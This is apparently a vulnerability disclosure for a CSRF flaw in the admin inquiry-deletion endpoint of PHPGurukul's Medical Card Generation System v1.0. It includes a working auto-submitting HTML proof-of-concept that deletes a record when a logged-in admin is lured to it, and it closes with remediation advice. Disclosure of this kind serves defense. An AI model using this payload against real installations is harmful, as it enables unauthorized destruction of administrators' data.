**Project Name & Repo URL:**
[ Medicalcard Generations System](https://phpgurukul.com/medical-card-generation-system-using-php-and-mysql/)

**Vulnerability Type:**
CSRF

**Affected Version(s):** v1.0

**💣Vulnerability Description:**

A Cross-Site Request Forgery (CSRF) vulnerability exists in the Inquiry Management functionality `/mcgs/admin/readenq.php` of the Medical Card Generation System developed by PHPGurukul. The vulnerable endpoint allows an authenticated admin to delete inquiry records via a simple GET request, without requiring a CSRF token or validating the origin of the request.An attacker can exploit this flaw by tricking a logged-in admin into visiting a malicious page, causing unintended and unauthorized deletion of critical inquiry records without the admin’s knowledge or consent.

**👩‍💻Impact:**

Unauthorized Medical-Card Detail Deletion.

**🛜Proof-of-Concept (PoC):**

1)There was a delete functionality where only authenticated admin can delete inquery information.

![1](https://github.com/user-attachments/assets/ae49feeb-68e6-4e3d-9376-f9518d944dd0)
2) HTML code to send GET request to the endpoint `/mcgs/admin/readenq.php`.

```
<html>
  <body>
    <form action="http://127.0.0.1/mcgs/admin/readenq.php">
      <input type="hidden" name="id" value="3" />
      <input type="hidden" name="del" value="delete" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3)Use the HTML code and craft a malicious URL.

![2](https://github.com/user-attachments/assets/ef134b5b-fb0b-40ba-896f-fbc3e213b3b2)

4)After Admin clicks on the link, inquery information will be deleted.
![3](https://github.com/user-attachments/assets/38ce9d55-730b-4d10-9b23-50508e66fd70)
![4](https://github.com/user-attachments/assets/01fdec0a-cb34-4c8e-b2a6-7949a61728de)
![5](https://github.com/user-attachments/assets/be6d9a2c-ca2b-41f5-9b68-dbe05f9b942e)

**Recommendation:**

Implement of CSRF tokens in admin forms, enforce SameSite cookies, and validate request origin to prevent unauthorized actions.
